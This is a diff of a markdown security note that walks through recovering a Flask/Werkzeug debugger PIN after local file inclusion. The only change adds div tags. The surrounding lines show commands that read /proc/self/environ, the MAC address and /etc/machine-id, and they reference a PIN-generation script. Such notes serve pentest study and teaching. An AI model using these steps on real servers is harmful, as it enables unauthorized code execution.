@@ -9,11 +9,17 @@ tags: ["python", "flask", "werkzeug", "debug", "LFI"]
 
 #### 1. Get user
 
+<div>
+
 ```bash
 cat /proc/self/environ | grep -aE ('USER'|'LOGNAME')
 ```
 
+</div>
+
 #### 2. Get full path of the application
+
+<div>
 
 ```
 +------------------------------+
@@ -21,7 +27,11 @@ cat /proc/self/environ | grep -aE ('USER'|'LOGNAME')
 +------------------------------+
 ```
 
+</div>
+
 #### 3. Get MAC address
+
+<div>
 
 ```bash
 cat /sys/class/net/eth0/address
@@ -32,13 +42,21 @@ cat /sys/class/net/eth0/address
 python3 -c "print(int('<MAC_ADDRESS>'.replace(':',''), 16))"
 ```
 
+</div>
+
 #### 4. Create Machine ID String
+
+<div>
 
 ```bash
 echo $(cat /etc/machine-id)$(head -n 1 /proc/self/cgroup | rev | cut -d '/' -f1 | rev)
 ```
 
+</div>
+
 #### 5. Update public and private bits in Hacktrick's Script
+
+<div>
 
 ```python
 #!/usr/bin/env python3
@@ -87,5 +105,7 @@ if rv is None:
 
 print(rv)
 ```
+
+</div>
 
 <br>
